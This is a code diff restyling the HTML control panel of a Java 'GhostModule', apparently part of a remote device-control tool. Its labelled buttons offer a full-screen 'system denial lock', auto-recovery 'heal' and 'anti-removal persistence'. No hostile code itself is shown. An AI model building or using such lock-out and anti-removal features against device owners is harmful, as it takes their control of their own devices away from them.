@@ -376,7 +376,7 @@ public class GhostModule extends BaseModule {
 
         // 2. System Denial Lock
         html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
+        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.7rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
         html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width:100% !important; margin:15px 0 0 0;\">DEPLOY_LOCK</button>");
         html.append("</div>");
 
@@ -409,14 +409,14 @@ public class GhostModule extends BaseModule {
         html.append("</div></div>");
 
         // 7. Auto Pilot & Anti-Removal (Legacy Controls)
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,255,0.02); grid-column: 1 / -1;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">AUTOMATION_&_PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03); grid-column: 1 / -1;\">");
+        html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow); font-size: 0.7rem;\">AUTOMATION_&_PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
         html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px; margin-top: 10px;\">");
-        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); margin:0;\">INITIATE_HEAL</button>");
+        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">INITIATE_HEAL</button>");
         String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
         String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
-        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
-        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"margin:0;\">LOADING...</button>");
+        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
+        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">LOADING...</button>");
         html.append("</div></div>");
         
         html.append("</div></div>");
